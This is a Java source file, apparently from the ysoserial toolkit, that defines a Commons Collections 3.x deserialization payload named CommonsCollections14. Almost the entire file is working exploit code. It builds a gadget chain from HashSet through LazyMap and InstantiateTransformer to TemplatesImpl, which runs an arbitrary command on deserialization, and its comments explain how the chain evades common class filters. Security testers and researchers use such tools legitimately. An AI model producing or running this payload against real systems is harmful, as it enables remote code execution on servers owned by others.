package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import javax.xml.transform.Templates;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CC6 trigger + CC3 sink: HashSet + TiedMapEntry + LazyMap + InstantiateTransformer + TrAXFilter.
	Originally described as "K1" by @zema1.

	Gadget chain:
		ObjectInputStream.readObject()
			HashSet.readObject()
				HashMap.put()
					HashMap.hash()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer(TrAXFilter.class)
										InstantiateTransformer([Templates], [TemplatesImpl])
											TrAXFilter.<init>(TemplatesImpl)
												TemplatesImpl.newTransformer()
													defineClass() + newInstance()
														Runtime.exec()

	Why this matters:
		- InvokerTransformer is one of the most commonly filtered CC classes
		- InstantiateTransformer is rarely filtered (same package, much less known)
		- HashSet trigger works on all JDK versions (unlike AnnotationInvocationHandler in CC3)
		- Combines the best trigger (CC6) with the best filter-evasion sink (CC3)

	Requires:
		commons-collections 3.x
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.ZEMA1 })
public class CommonsCollections14 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		// inert chain for setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// real chain: InstantiateTransformer(TrAXFilter) -> TemplatesImpl
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(TrAXFilter.class),
			new InstantiateTransformer(
				new Class[] { Templates.class },
				new Object[] { templatesImpl })};

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		HashSet map = new HashSet(1);
		map.add("foo");

		Field f = null;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = Reflections.getField(node.getClass(), "key");
		keyField.set(node, entry);

		// arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections14.class, args);
	}
}
